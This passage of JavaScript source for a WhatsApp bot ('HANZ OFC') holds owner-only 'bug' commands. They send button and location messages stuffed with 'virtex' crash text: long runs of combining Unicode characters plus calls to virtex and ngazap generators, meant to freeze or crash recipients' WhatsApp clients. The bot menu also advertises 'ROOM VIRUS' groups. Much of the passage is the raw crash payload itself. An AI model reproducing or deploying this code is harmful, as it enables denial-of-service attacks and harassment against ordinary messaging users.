ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ𝟗𝟗𝟗`,},type:1}])
        break
case 'bug':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')			
res = await Hanz.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"locationMessage": {
						"degreesLatitude": -6.105394271969506,
						"degreesLongitude": 106.71700716018677
					 },
						"contentText": `❏HANZ々OFC彡❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
╔═════════════════⎉
║冬Nama Bot : ${botname}
║冬Nama Owner : ${ownername}
║冬Nomor Owner : ${owner}
║冬Creator : ${creator}
║冬Mode : ${publik ? 'Public' : 'Self'}
║冬Runtime : ${runtime(process.uptime())}
║冬Prefix : Multi
║冬Battery : ${baterai.battery}
║冬Charged : ${baterai.isCharge ? 'Cas' : 'Tidak'}
║冬Autoread pc : ${readP ? 'On' : 'Off'}
║冬Autoread gc : ${readG ? 'On' : 'Off'}
║冬Auto Ketik : ${ngetik ? 'On' : 'Off'}
║冬Auto Recording : ${autovn ? 'On' : 'Off'}
╚═════════════════❍ 
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!
YUK JOIN ALL GROUP AKU

GROUP HANZ々OFC彡[INFO]
https://chat.whatsapp.com/JPrMnQZao82D6bEeZKBNQ2

GROUP HANZ々OFC彡[BOT WA]
https://chat.whatsapp.com/H2dvuYaI3SbKURzstwl7Wn

ROOM VIRUS 1/2
V1: https://chat.whatsapp.com/GsG7Dvu6ymPL3wqHubftIG

V2: https://chat.whatsapp.com/CuVbS5XaimTIl4LuKTahYq
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "HANZ々OFC彡",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` ${virtex2(prefix)}${virtex9(prefix)}${virtex5(prefix)}${virtex9(prefix)}${ngazap(prefix)}ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "LOCATION"
					}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break        
//BUG BUTTON V2
case 'hanzofc':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
					res =  Hanz.prepareMessageFromContent(from,{
				"buttonsMessage": {
						"text": "",
						"contentText": "HANZ々OFC彡",
						"footerText": `BUGBOT RASA CACING🗿`,
						"buttons": [
							{
								"buttonId": "By:Hanz-Ofc",
								"buttonText": {
									"displayText": `${virtex2(prefix)}${virtex5(prefix)}${virtex9(prefix)}${ngazap(prefix)}ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰًًًًًࣰࣱࣱࣱٍ᳕ܾࣶࣶ֖֖᷽᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩۡ᪳ࣧࣧ᪳́ࣼ᳚᪳̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًًࣰًًًًً᳕ܾࣶࣶ֖֖᷽᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ